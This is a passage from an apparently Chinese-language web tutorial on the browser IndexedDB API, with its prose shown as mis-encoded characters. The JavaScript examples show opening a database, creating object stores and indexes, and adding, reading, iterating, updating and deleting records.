</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><strong>ï¼ˆ2ï¼‰success äº‹ä»¶</strong></p> <p><code>success</code>äº‹ä»¶è¡¨ç¤ºæˆåŠŸæ‰“å¼€æ•°æ®åº“ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> db<span class="token punctuation">;</span>

request<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  db <span class="token operator">=</span> request<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ•°æ®åº“æ‰“å¼€æˆåŠŸ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>è¿™æ—¶ï¼Œé€šè¿‡<code>request</code>å¯¹è±¡çš„<code>result</code>å±æ€§æ‹¿åˆ°æ•°æ®åº“å¯¹è±¡ã€‚</p> <p><strong>ï¼ˆ3ï¼‰upgradeneeded äº‹ä»¶</strong></p> <p>å¦‚æœæŒ‡å®šçš„ç‰ˆæœ¬å·ï¼Œå¤§äºæ•°æ®åº“çš„å®é™…ç‰ˆæœ¬å·ï¼Œå°±ä¼šå‘ç”Ÿæ•°æ®åº“å‡çº§äº‹ä»¶<code>upgradeneeded</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> db<span class="token punctuation">;</span>

request<span class="token punctuation">.</span><span class="token function-variable function">onupgradeneeded</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  db <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>è¿™æ—¶é€šè¿‡äº‹ä»¶å¯¹è±¡çš„<code>target.result</code>å±æ€§ï¼Œæ‹¿åˆ°æ•°æ®åº“å®ä¾‹ã€‚</p> <h3 id="æ–°å»ºæ•°æ®åº“"><a href="#æ–°å»ºæ•°æ®åº“" class="header-anchor">#</a> æ–°å»ºæ•°æ®åº“</h3> <p>æ–°å»ºæ•°æ®åº“ä¸æ‰“å¼€æ•°æ®åº“æ˜¯åŒä¸€ä¸ªæ“ä½œã€‚å¦‚æœæŒ‡å®šçš„æ•°æ®åº“ä¸å­˜åœ¨ï¼Œå°±ä¼šæ–°å»ºã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼Œåç»­çš„æ“ä½œä¸»è¦åœ¨<code>upgradeneeded</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°é‡Œé¢å®Œæˆï¼Œå› ä¸ºè¿™æ—¶ç‰ˆæœ¬ä»æ— åˆ°æœ‰ï¼Œæ‰€ä»¥ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ã€‚</p> <p>é€šå¸¸ï¼Œæ–°å»ºæ•°æ®åº“ä»¥åï¼Œç¬¬ä¸€ä»¶äº‹æ˜¯æ–°å»ºå¯¹è±¡ä»“åº“ï¼ˆå³æ–°å»ºè¡¨ï¼‰ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>request<span class="token punctuation">.</span><span class="token function-variable function">onupgradeneeded</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  db <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token keyword">var</span> objectStore <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> keyPath<span class="token operator">:</span> <span class="token string">'id'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ•°æ®åº“æ–°å»ºæˆåŠŸä»¥åï¼Œæ–°å¢ä¸€å¼ å«åš<code>person</code>çš„è¡¨æ ¼ï¼Œä¸»é”®æ˜¯<code>id</code>ã€‚</p> <p>æ›´å¥½çš„å†™æ³•æ˜¯å…ˆåˆ¤æ–­ä¸€ä¸‹ï¼Œè¿™å¼ è¡¨æ ¼æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨å†æ–°å»ºã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>request<span class="token punctuation">.</span><span class="token function-variable function">onupgradeneeded</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  db <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token keyword">var</span> objectStore<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>db<span class="token punctuation">.</span>objectStoreNames<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    objectStore <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> keyPath<span class="token operator">:</span> <span class="token string">'id'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸»é”®ï¼ˆkeyï¼‰æ˜¯é»˜è®¤å»ºç«‹ç´¢å¼•çš„å±æ€§ã€‚æ¯”å¦‚ï¼Œæ•°æ®è®°å½•æ˜¯<code>{ id: 1, name: 'å¼ ä¸‰' }</code>ï¼Œé‚£ä¹ˆ<code>id</code>å±æ€§å¯ä»¥ä½œä¸ºä¸»é”®ã€‚ä¸»é”®ä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸‹ä¸€å±‚å¯¹è±¡çš„å±æ€§ï¼Œæ¯”å¦‚<code>{ foo: { bar: 'baz' } }</code>çš„<code>foo.bar</code>ä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸»é”®ã€‚</p> <p>å¦‚æœæ•°æ®è®°å½•é‡Œé¢æ²¡æœ‰åˆé€‚ä½œä¸ºä¸»é”®çš„å±æ€§ï¼Œé‚£ä¹ˆå¯ä»¥è®© IndexedDB è‡ªåŠ¨ç”Ÿæˆä¸»é”®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> objectStore <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span>
  <span class="token string">'person'</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span> autoIncrement<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼ŒæŒ‡å®šä¸»é”®ä¸ºä¸€ä¸ªé€’å¢çš„æ•´æ•°ã€‚</p> <p>æ–°å»ºå¯¹è±¡ä»“åº“ä»¥åï¼Œä¸‹ä¸€æ­¥å¯ä»¥æ–°å»ºç´¢å¼•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>request<span class="token punctuation">.</span><span class="token function-variable function">onupgradeneeded</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  db <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>
  <span class="token keyword">var</span> objectStore <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">createObjectStore</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> keyPath<span class="token operator">:</span> <span class="token string">'id'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  objectStore<span class="token punctuation">.</span><span class="token function">createIndex</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> unique<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  objectStore<span class="token punctuation">.</span><span class="token function">createIndex</span><span class="token punctuation">(</span><span class="token string">'email'</span><span class="token punctuation">,</span> <span class="token string">'email'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> unique<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>IDBObject.createIndex()</code>çš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸ºç´¢å¼•åç§°ã€ç´¢å¼•æ‰€åœ¨çš„å±æ€§ã€é…ç½®å¯¹è±¡ï¼ˆè¯´æ˜è¯¥å±æ€§æ˜¯å¦åŒ…å«é‡å¤çš„å€¼ï¼‰ã€‚</p> <h3 id="æ–°å¢æ•°æ®"><a href="#æ–°å¢æ•°æ®" class="header-anchor">#</a> æ–°å¢æ•°æ®</h3> <p>æ–°å¢æ•°æ®æŒ‡çš„æ˜¯å‘å¯¹è±¡ä»“åº“å†™å…¥æ•°æ®è®°å½•ã€‚è¿™éœ€è¦é€šè¿‡äº‹åŠ¡å®Œæˆã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> request <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'person'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readwrite'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span> id<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">'å¼ ä¸‰'</span><span class="token punctuation">,</span> age<span class="token operator">:</span> <span class="token number">24</span><span class="token punctuation">,</span> email<span class="token operator">:</span> <span class="token string">'zhangsan@example.com'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  request<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ•°æ®å†™å…¥æˆåŠŸ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  request<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ•°æ®å†™å…¥å¤±è´¥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå†™å…¥æ•°æ®éœ€è¦æ–°å»ºä¸€ä¸ªäº‹åŠ¡ã€‚æ–°å»ºæ—¶å¿…é¡»æŒ‡å®šè¡¨æ ¼åç§°å’Œæ“ä½œæ¨¡å¼ï¼ˆâ€œåªè¯»â€æˆ–â€œè¯»å†™â€ï¼‰ã€‚æ–°å»ºäº‹åŠ¡ä»¥åï¼Œé€šè¿‡<code>IDBTransaction.objectStore(name)</code>æ–¹æ³•ï¼Œæ‹¿åˆ° IDBObjectStore å¯¹è±¡ï¼Œå†é€šè¿‡è¡¨æ ¼å¯¹è±¡çš„<code>add()</code>æ–¹æ³•ï¼Œå‘è¡¨æ ¼å†™å…¥ä¸€æ¡è®°å½•ã€‚</p> <p>å†™å…¥æ“ä½œæ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œé€šè¿‡ç›‘å¬è¿æ¥å¯¹è±¡çš„<code>success</code>äº‹ä»¶å’Œ<code>error</code>äº‹ä»¶ï¼Œäº†è§£æ˜¯å¦å†™å…¥æˆåŠŸã€‚</p> <h3 id="è¯»å–æ•°æ®"><a href="#è¯»å–æ•°æ®" class="header-anchor">#</a> è¯»å–æ•°æ®</h3> <p>è¯»å–æ•°æ®ä¹Ÿæ˜¯é€šè¿‡äº‹åŠ¡å®Œæˆã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">var</span> transaction <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'person'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">var</span> objectStore <span class="token operator">=</span> transaction<span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">var</span> request <span class="token operator">=</span> objectStore<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

   request<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'äº‹åŠ¡å¤±è´¥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span><span class="token punctuation">;</span>

   request<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Name: '</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>result<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Age: '</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>result<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Email: '</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>result<span class="token punctuation">.</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æœªè·å¾—æ•°æ®è®°å½•'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
   <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>objectStore.get()</code>æ–¹æ³•ç”¨äºè¯»å–æ•°æ®ï¼Œå‚æ•°æ˜¯ä¸»é”®çš„å€¼ã€‚</p> <h3 id="éå†æ•°æ®"><a href="#éå†æ•°æ®" class="header-anchor">#</a> éå†æ•°æ®</h3> <p>éå†æ•°æ®è¡¨æ ¼çš„æ‰€æœ‰è®°å½•ï¼Œè¦ä½¿ç”¨æŒ‡é’ˆå¯¹è±¡ IDBCursorã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">readAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> objectStore <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

   objectStore<span class="token punctuation">.</span><span class="token function">openCursor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">var</span> cursor <span class="token operator">=</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">;</span>

     <span class="token keyword">if</span> <span class="token punctuation">(</span>cursor<span class="token punctuation">)</span> <span class="token punctuation">{</span>
       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Id: '</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Name: '</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Age: '</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Email: '</span> <span class="token operator">+</span> cursor<span class="token punctuation">.</span>value<span class="token punctuation">.</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>
       cursor<span class="token punctuation">.</span><span class="token function">continue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ²¡æœ‰æ›´å¤šæ•°æ®äº†ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">readAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ–°å»ºæŒ‡é’ˆå¯¹è±¡çš„<code>openCursor()</code>æ–¹æ³•æ˜¯ä¸€ä¸ªå¼‚æ­¥æ“ä½œï¼Œæ‰€ä»¥è¦ç›‘å¬<code>success</code>äº‹ä»¶ã€‚</p> <h3 id="æ›´æ–°æ•°æ®"><a href="#æ›´æ–°æ•°æ®" class="header-anchor">#</a> æ›´æ–°æ•°æ®</h3> <p>æ›´æ–°æ•°æ®è¦ä½¿ç”¨<code>IDBObject.put()</code>æ–¹æ³•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> request <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'person'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readwrite'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token punctuation">{</span> id<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">'æå››'</span><span class="token punctuation">,</span> age<span class="token operator">:</span> <span class="token number">35</span><span class="token punctuation">,</span> email<span class="token operator">:</span> <span class="token string">'lisi@example.com'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  request<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ•°æ®æ›´æ–°æˆåŠŸ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  request<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ•°æ®æ›´æ–°å¤±è´¥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>put()</code>æ–¹æ³•è‡ªåŠ¨æ›´æ–°äº†ä¸»é”®ä¸º<code>1</code>çš„è®°å½•ã€‚</p> <h3 id="åˆ é™¤æ•°æ®"><a href="#åˆ é™¤æ•°æ®" class="header-anchor">#</a> åˆ é™¤æ•°æ®</h3> <p><code>IDBObjectStore.delete()</code>æ–¹æ³•ç”¨äºåˆ é™¤è®°å½•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> request <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">transaction</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'person'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'readwrite'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">objectStore</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  request<span class="token punctuation">.</span><span class="token function-variable function">onsuccess</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'æ•°æ®åˆ é™¤æˆåŠŸ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="ä½¿ç”¨ç´¢å¼•"><a href="#ä½¿ç”¨ç´¢å¼•" class="header-anchor">#</a> ä½¿ç”¨ç´¢å¼•</h3> <p>ç´¢å¼•çš„æ„ä¹‰åœ¨äºï¼Œå¯ä»¥è®©ä½ æœç´¢ä»»æ„å­—æ®µï¼Œä¹Ÿå°±æ˜¯è¯´ä»ä»»æ„å­—æ®µæ‹¿åˆ°æ•°æ®è®°å½•ã€‚å¦‚æœä¸å»ºç«‹ç´¢å¼•ï¼Œé»˜è®¤åªèƒ½æœç´¢ä¸»é”®ï¼ˆå³ä»ä¸»é”®å–å€¼ï¼‰ã€‚</p> <p>å‡å®šæ–°å»ºè¡¨æ ¼çš„æ—¶å€™ï¼Œå¯¹<code>name</code>å­—æ®µå»ºç«‹äº†ç´¢å¼•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>objectStore<span class="token punctuation">.</span><span class="token function">createIndex</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> unique<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
